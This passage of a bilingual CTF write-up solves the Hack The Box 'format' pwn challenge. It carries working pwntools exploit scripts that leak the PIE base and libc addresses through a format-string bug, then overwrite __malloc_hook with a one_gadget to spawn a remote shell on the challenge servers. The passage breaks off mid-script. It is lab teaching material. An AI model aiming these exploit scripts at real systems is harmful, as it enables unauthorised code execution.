0x7ffcdede84fb</span><br><span class="line">81: 0x7ffcdede8514</span><br><span class="line">82: 0x7ffcdede8529</span><br><span class="line">83: 0x7ffcdede8536</span><br><span class="line">84: 0x7ffcdede8545</span><br><span class="line">85: 0x7ffcdede85a3</span><br><span class="line">86: 0x7ffcdede85ae</span><br><span class="line">87: 0x7ffcdede85b9</span><br><span class="line">88: 0x7ffcdede85c6</span><br><span class="line">89: 0x7ffcdede85d9</span><br><span class="line">90: 0x7ffcdede85fe</span><br><span class="line">91: 0x7ffcdede8612</span><br><span class="line">92: 0x7ffcdede8622</span><br><span class="line">93: 0x7ffcdede865c</span><br><span class="line">94: 0x7ffcdede8679</span><br><span class="line">95: 0x7ffcdede8683</span><br><span class="line">96: 0x7ffcdede86d1</span><br><span class="line">97: 0x7ffcdede86d9</span><br><span class="line">98: 0x7ffcdede86ea</span><br><span class="line">99: 0x7ffcdede86ff</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./format&#x27;</span> (pid 4567)</span><br></pre></td></tr></table></figure>
+
+<p>正如上图所示，能够从堆栈中枚举元素。更有趣的是，自己的字符串格式输入似乎出现在堆栈上的偏移量6。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">35: 0x6161616161616161</span><br><span class="line">36: 0x6161616161616161</span><br><span class="line">37: 0x61616161616161</span><br><span class="line">38: (nil)</span><br><span class="line">39: 0x2a0cd2c9e1808e00</span><br><span class="line">40: 0x7ffcdede78d0</span><br><span class="line">41: 0x55ff366b72b3</span><br><span class="line">42: 0x7ffcdede79c0</span><br><span class="line">43: 0x2a0cd2c9e1808e00</span><br><span class="line">44: 0x55ff366b72d0</span><br><span class="line">45: 0x7f6b05c32d0a</span><br></pre></td></tr></table></figure>
+
+<p>再往下看堆栈，注意到字符串格式的输入以偏移量37-38结束。然而，接下来，注意到偏移量41处的echo返回地址。这可能表明，尽管启用了PIE，仍然能够泄漏二进制文件的基址。得先核实一下。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format13.jpg"></li>
+</ul>
+<p>从上图中可以看出，echo ends调用的返回地址位于偏移量0x12b3，这与堆栈上发现的泄漏相对应。因此，可以假定栈上的元素是返回地址，因此可以通过从泄漏的地址减去0x12b3来计算二进制数据的基址。可以按照如下所示编写脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s.sendline(<span class="string">&#x27;%41$p &#x27;</span>)</span><br><span class="line">base_ret = int(s.recv(1024).<span class="built_in">split</span>(<span class="string">&#x27; &#x27;</span>)[0], 16)</span><br><span class="line">base = base_ret - 0x12b3</span><br></pre></td></tr></table></figure>
+
+<p>现在有了二进制文件的基址，可以尝试进一步从libc泄漏一个地址，这样就可以找到libc的基址。首先在got小节中获取printf导入的偏移量。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># objdump -R format | grep printf</span></span><br><span class="line">0000000000003fc0 R_X86_64_JUMP_SLOT  <span class="built_in">printf</span>@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>
+
+<p>现在有了偏移量，可以使用’ %s ‘格式说明符对堆栈执行更深入的读取。’ %p ‘指示符只输出存储在堆栈中给定偏移量处的值，与之相反，’ %s ‘指示符将存储在堆栈中给定偏移量处的值作为指向字符串的指针，并输出字符串的内容。</p>
+<p>由于可以通过从偏移量6开始的字符串格式输入来控制一些堆栈元素，因此可以使用该格式指定要从偏移量7检索字符串数据，然后指定偏移量7的目标地址。可以按照如下所示编写脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gots_printf = base + 0x3fc0</span><br><span class="line">s.sendline(<span class="string">&#x27;%7$s&#x27;</span>.ljust(8, <span class="string">&#x27;\x00&#x27;</span>) + p64(gots_printf))</span><br><span class="line">glibc_printf = u64(s.recv(1024).ljust(8, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;GLIBC(printf) leak: &#123;&#125;&quot;</span>.format(hex(glibc_printf))</span><br></pre></td></tr></table></figure>
+
+<p>现在，运行泄漏脚本，并验证能够泄漏来自libc共享库的地址。</p>
+<ul>
+<li>leak.py</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">s = remote(<span class="string">&#x27;178.128.40.217&#x27;</span>, 32755) <span class="comment"># 31019)</span></span><br><span class="line">s.sendline(<span class="string">&#x27;%41$p &#x27;</span>)</span><br><span class="line"></span><br><span class="line">base_ret = int(s.recv(1024).<span class="built_in">split</span>(<span class="string">&#x27; &#x27;</span>)[0], 16)</span><br><span class="line">base = base_ret - 0x12b3</span><br><span class="line">gots_printf = base + 0x3fc0</span><br><span class="line"></span><br><span class="line">s.sendline(<span class="string">&#x27;%7$s&#x27;</span>.ljust(8, <span class="string">&#x27;\x00&#x27;</span>) + p64(gots_printf))</span><br><span class="line"></span><br><span class="line">glibc_printf = u64(s.recv(1024).ljust(8, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;GLIBC(printf) leak: &#123;&#125;&quot;</span>.format(hex(glibc_printf))</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># python leak.py </span></span><br><span class="line">[+] Opening connection to 178.128.40.217 on port 32755: Done</span><br><span class="line">GLIBC(<span class="built_in">printf</span>) leak: 0x7f436277be80</span><br><span class="line">[*] Closed connection to 178.128.40.217 port 32755</span><br></pre></td></tr></table></figure>
+
+<p>如上图所示，成功地在libc共享库中获取了printf函数的地址。由于ASLR在页面长度为0x1000字节的页面对齐基础上随机化libc共享库的位置，所以可以确保地址的最后3个字节永远不会随机化。因此，可以使用最后三部分来确定远程服务器正在使用的libc版本。</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">libc database search<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>使用在线libc数据库搜索工具来定位一个libc库，其中的printf函数以0xe80结束。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format14.jpg"></li>
+</ul>
+<p>如上图所示，有多个候选对象。一个有根据的猜测把我们带到了选择的版本。现在可以在数据库中查找所有的符号，也可以在Ubuntu存储库中找到文件并下载它。在本例中，选择查找libc版本并下载它。由于不能保证外部链接的生命周期，所以将下面的文件作为直接下载链接。</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9zdGFja2hvdW5kLm1lL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIwLzA5L2IwM2JhMGM5OGQwZjBiYzkuN3o=">libc6_2.27-3ubuntu1_amd64.deb<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>现在可以使用7-zip这样的解压缩工具来打开这个包。</p>
+<p>在debian包中，找到libc共享库并将其转储到磁盘。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format15.jpg"></li>
+</ul>
+<p>现在可以访问远程进程中的libc共享库，需要考虑攻击策略。因为程序有完整的RELRO，所以不能覆盖get部分的fgets或printf指针，这是唯一可以直接控制的函数。然而，可以覆盖libc共享库中的内容，比如__malloc_hook。malloc钩子是一个函数指针，当它非空时，每次使用malloc分配内存时都会调用它。然而，没有任何方式传递参数给重写的malloc钩子，不能使系统直接生成一个’&#x2F;bin&#x2F;sh’进程。相反，可以使用one-gadget，这是libc中的一个gadget，它生成’&#x2F;bin&#x2F;sh’，而不需要向它传递任何参数。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># objdump -T ./libc-2.27.so | grep malloc_hook</span></span><br><span class="line">00000000003ebc30  w   DO .data  0000000000000008  GLIBC_2.2.5 __malloc_hook</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># one_gadget ./libc-2.27.so</span></span><br><span class="line">0x4f2c5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
+
+<p>如上所示，可以确定所需的偏移量。可以按照如下所示编写脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">glibc_base = glibc_printf - 0x64e80</span><br><span class="line">glibc_malloc_hook = glibc_base + 0x3ebc30</span><br><span class="line">glibc_one_gadget = glibc_base + 0x4f322</span><br></pre></td></tr></table></figure>
+
+<p>现在已经有了所需的所有组件，可以继续进行攻击了。就像使用’ %p ‘和’ %s ‘从堆栈中读取变量一样，也可以使用’ %n ‘对它们进行写入。’ %n ‘说明符将把字符串中先于它的字节数写到堆栈上传递的目标参数中。例如，printf(‘ 1234%n ‘， &amp;destination)将把4写入destination。可以使用printf(‘ %XXc%Y$n ‘)每次覆盖一个字节，其中XX表示字节的数值，Y表示堆栈上的目标偏移量。使用pwntools的延迟版本如下所示。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.sendline(fmtstr_payload(6, &#123; glibc_malloc_hook: glibc_one_gadget &#125;))</span><br><span class="line">s.recv(1024)</span><br></pre></td></tr></table></figure>
+
+<p>现在已经覆盖了malloc钩子，需要做的就是使用malloc强制分配。一种方法是让格式字符串说明符生成一个太大而不能临时存储在堆栈上的字符串，从而迫使printf函数使用malloc进行临时分配。这可以如下所示完成。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.sendline(<span class="string">&#x27;%100000c&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>最终exp脚本</p>
+<ul>
+<li>getshell.py</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">s = remote(<span class="string">&#x27;178.128.40.217&#x27;</span>, 32755) <span class="comment"># 31019)</span></span><br><span class="line">s.sendline(<span class="string">&#x27;%41$p bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">base_ret = int(s.recvuntil(<span class="string">&#x27;bbbb\n&#x27;</span>).<span class="built_in">split</span>(<span class="string">&#x27; &#x27;</span>)[0], 16)</span><br><span class="line">base = base_ret - 0x12b3</span><br><span class="line">gots_printf = base + 0x3fc0</span><br><span class="line"></span><br><span class="line">s.sendline(<span class="string">&#x27;%7$s&#x27;</span>.ljust(8, <span class="string">&#x27;\x00&#x27;</span>) + p64(gots_printf))</span><br><span class="line"></span><br><span class="line">glibc_printf = u64(s.recv(1024).ljust(8, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;GLIBC(printf) leak: &#123;&#125;&quot;</span>.format(hex(glibc_printf))</span><br><span class="line">glibc_base = glibc_printf - 0x64e80</span><br><span class="line">glibc_malloc_hook = glibc_base + 0x3ebc30</span><br><span class="line">glibc_one_gadget = glibc_base + 0x4f322</span><br><span class="line"></span><br><span class="line">s.sendline(fmtstr_payload(6, &#123; glibc_malloc_hook: glibc_one_gadget &#125;))</span><br><span class="line">s.recv(1024)</span><br><span class="line">s.sendline(<span class="string">&#x27;%100000c&#x27;</span>)</span><br><span class="line">s.interactive()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<p>利用效果。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format16.jpg"></li>
+</ul>
+<h2 id="详细过程及exp-2"><a href="#详细过程及exp-2" class="headerlink" title="详细过程及exp - 2"></a>详细过程及exp - 2</h2><h3 id="1-Basic-checks"><a href="#1-Basic-checks" class="headerlink" title="1. Basic checks:"></a>1. Basic checks:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># file format </span></span><br><span class="line">format: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5d38e04d29b4aae722164869f3151cea776ce91c, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># checksec format</span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/format/format&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Run-binary-with-format-string-as-input-and-spot-the-vulnerability"><a href="#2-Run-binary-with-format-string-as-input-and-spot-the-vulnerability" class="headerlink" title="2. Run binary with format string as input and spot the vulnerability:"></a>2. Run binary with format string as input and spot the vulnerability:</h3><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9vd2FzcC5vcmcvd3d3LWNvbW11bml0eS9hdHRhY2tzL0Zvcm1hdF9zdHJpbmdfYXR0YWNr">Format string attack<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># ./format </span></span><br><span class="line">%p%p%p</span><br><span class="line">0x7f167f86da03(nil)0x7f167f79de8e</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Disassemble-binary-with-your-favorite-disassembler"><a href="#3-Disassemble-binary-with-your-favorite-disassembler" class="headerlink" title="3. Disassemble binary with your favorite disassembler:"></a>3. Disassemble binary with your favorite disassembler:</h3><p>Vulnerable is printf() which should look like: printf(“%s\n”, argv[1]);</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format17.jpg"></li>
+</ul>
+<h3 id="4-General-overview-of-what-is-being-leaked"><a href="#4-General-overview-of-what-is-being-leaked" class="headerlink" title="4. General overview of what is being leaked:"></a>4. General overview of what is being leaked:</h3><p>(1) 6th pointer — beginning of the printf() output</p>
+<p>(2) 30th pointer — three free bytes which you need to keep in mind when you leak data using the printf() function (due to stack alignment) additionally, the direct parameter access to this pointer will change depending on the amount of data passed to the printf() function</p>
+<p>(3) 37th pointer — init+117address needed for calculating libc base</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format18.jpg"></li>
+</ul>
+<h3 id="5-Run-binary-in-GDB-—-defeating-PIE"><a href="#5-Run-binary-in-GDB-—-defeating-PIE" class="headerlink" title="5. Run binary in GDB — defeating PIE:"></a>5. Run binary in GDB — defeating PIE:</h3><p>set a breakpoint at the printf() in echo()</p>
+<p>check the init+117 PIE offset (before execution in GBD)</p>
+<p>using <span class="exturl" data-url="aHR0cHM6Ly9rZXZpbmFsbWFuc2EuZ2l0aHViLmlvL2FwcGxpY2F0aW9uJTIwc2VjdXJpdHkvRm9ybWF0LVN0cmluZ3Mv">direct parameter access<i class="fa fa-external-link-alt"></i></span> input format string %37$p to leak init+117address</p>
+<p>calculate the base ELF address after a leak to bypass the PIE security</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format19.jpg"></li>
+</ul>
+<p>You can verify the base address of ELF file using vmmap or info proc map</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format20.jpg"></li>
+</ul>
+<p>The first phase of exploit written in python2 based on pwntools containing everything so far.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format21.jpg"></li>
+</ul>
+<h3 id="6-Leak-the-printf-address-from-libc-through-printf"><a href="#6-Leak-the-printf-address-from-libc-through-printf" class="headerlink" title="6. Leak the __printf address from libc through printf():"></a>6. Leak the __printf address from libc through printf():</h3><ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format22.jpg"></li>
+</ul>
+<p>Use %s instead of %p<br>(access value printed by printf() instead of a <span class="exturl" data-url="aHR0cHM6Ly9keWNsYXNzcm9vbS5jb20vYy9jLXBvaW50ZXJzLWFuZC1zdHJpbmdz">pointer to the string<i class="fa fa-external-link-alt"></i></span>)</p>
+<p>Remember about stack alignment</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format23.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format24.jpg"></p>
+</li>
+</ul>
+<h3 id="7-Check-the-libc-version-on-the-remote-system"><a href="#7-Check-the-libc-version-on-the-remote-system" class="headerlink" title="7. Check the libc version on the remote system"></a>7. Check the libc version on the remote system</h3><p>Use <span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span> with the leaked address of __printf to check the libc version being used on the remote system.</p>
+<p>Check possible libc architecture, there is clearly only one option which is libc6_2.27–3ubuntu1_amd64 because it is the only one 64-bit libc.</p>
+<p>Download above libc and place it in the directory with exploit.py</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format25.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format26.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format27.jpg"></p>
+</li>
+</ul>
+<h3 id="8-Taking-control-of-execution-flow"><a href="#8-Taking-control-of-execution-flow" class="headerlink" title="8. Taking control of execution flow:"></a>8. Taking control of execution flow:</h3><p>The program has FULL RELRO, so there is no option of rewriting the fgets() or printf() address, but the content of libc shared libraries is writeable. Use this advantage to overwrite __malloc_hook function pointer.</p>
+<p>The vulnerable function in this scenario is malloc() which is called, when the string sent to printf() is too big, __malloc_hook is called whenever malloc() is used.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># check __malloc_hook in leaked libc</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># objdump -T libc-2.27.so | grep __malloc_hook</span></span><br><span class="line">00000000003ebc30  w   DO .data  0000000000000008  GLIBC_2.2.5 __malloc_hook</span><br></pre></td></tr></table></figure>
+
+<p>You can trigger malloc() by calling printf(“%10000$c”) — this allocates too many bytes for the stack, forcing libc to allocate the space on the heap instead.</p>
+<p>You can overwrite the __malloc_hook using direct parameter write %6$n</p>
+<p>It is not possible to specify the parameters of the overridden __malloc_hook . The way out of this situation will be to use a <span class="exturl" data-url="aHR0cHM6Ly9kem9uZS5jb20vYXJ0aWNsZXMvYS1jdGYtZXhhbXBsZS1zaG93cy15b3UtdGhlLWVhc3ktYW5kLXBvd2VyZnVsLW9uZQ==">gadget<i class="fa fa-external-link-alt"></i></span> called <span class="exturl" data-url="aHR0cHM6Ly9pcjBuc3RvbmUuZ2l0Ym9vay5pby9ub3Rlcy90eXBlcy9zdGFjay9vbmUtZ2FkZ2V0cy1hbmQtbWFsbG9jLWhvb2s=">one_gadget<i class="fa fa-external-link-alt"></i></span> which in fact is a execve(“&#x2F;bin&#x2F;sh”) command that is present in libc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># one_gadget libc-2.27.so</span></span><br><span class="line">0x4f2c5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-Calculating-necessary-addresses"><a href="#8-Calculating-necessary-addresses" class="headerlink" title="8. Calculating necessary addresses:"></a>8. Calculating necessary addresses:</h3><p>Calculate base address of libc, by subtracting the 0x64e80 from the leaked printf()</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># objdump -T libc-2.27.so | grep &quot; printf$&quot;</span></span><br><span class="line">0000000000064e80 g    DF .text  00000000000000c3  GLIBC_2.2.5 <span class="built_in">printf</span></span><br></pre></td></tr></table></figure>
+
+<p>Calculate __malloc_hook and one_gadget based on the computed libc and static addresses from leaked libc.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format28.jpg"></li>
+</ul>
+<p>Use <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB3bnRvb2xzLmNvbS9lbi9zdGFibGUvZm10c3RyLmh0bWwjbW9kdWxlLXB3bmxpYi5mbXRzdHI=">pwnlib.fmtstr<i class="fa fa-external-link-alt"></i></span> — <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB3bnRvb2xzLmNvbS9lbi9zdGFibGUvZm10c3RyLmh0bWw=">format string<i class="fa fa-external-link-alt"></i></span> bug exploitation tools to easily calculate and override __malloc_hook with one gadget and trigger it!</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format29.jpg"></li>
+</ul>
+<p>Add context.arch &#x3D; “amd64” at the top of the script to choose the system architecture of the targeted binary. Otherwise, an error will pop up.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format30.jpg"></li>
+</ul>
+<h3 id="9-Final-exploit"><a href="#9-Final-exploit" class="headerlink" title="9. Final exploit:"></a>9. Final exploit:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;format&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>) <span class="comment"># &lt;-- Loading leaked libc </span></span><br><span class="line"><span class="comment">#p = process(&quot;./format&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;188.166.173.208&quot;</span>,<span class="number">31941</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;&#x27;&#x27;b*__malloc_hook&#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ELF base address - leaking &amp;&amp; calculating ---</span></span><br><span class="line">p.sendline(<span class="string">&quot;%37$p&quot;</span>)</span><br><span class="line">init_leak = (p.recvline())</span><br><span class="line">log.success(<span class="string">&quot;LEAK =&gt; (init+117) address: &quot;</span> + init_leak)</span><br><span class="line">base_elf = <span class="built_in">int</span>(init_leak,<span class="number">16</span>) - <span class="number">0x126d</span></span><br><span class="line">log.info(<span class="string">&quot;Base ELF address: &quot;</span> + <span class="built_in">hex</span>(base_elf))</span><br><span class="line">elf.address = base_elf <span class="comment"># updating ELF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaking __printf address through printf() ---</span></span><br><span class="line">printf_got_plt = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;printf@got.plt address: &quot;</span> + <span class="built_in">hex</span>(printf_got_plt))</span><br><span class="line">p.sendline(<span class="string">&quot;AAAA%7$s&quot;</span> + p64(printf_got_plt))</span><br><span class="line">printf_leak = p.recv()</span><br><span class="line">printf_libc = u64(printf_leak[<span class="number">4</span>:<span class="number">10</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Leaked __printf: &quot;</span> + <span class="built_in">hex</span>(printf_libc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculating base libc, __malloc_hook and one_gadget ---</span></span><br><span class="line">base_libc = printf_libc - <span class="number">0x64e80</span></span><br><span class="line">malloc_hook_addr = base_libc + <span class="number">0x3ebc30</span></span><br><span class="line">one_gadget = base_libc + 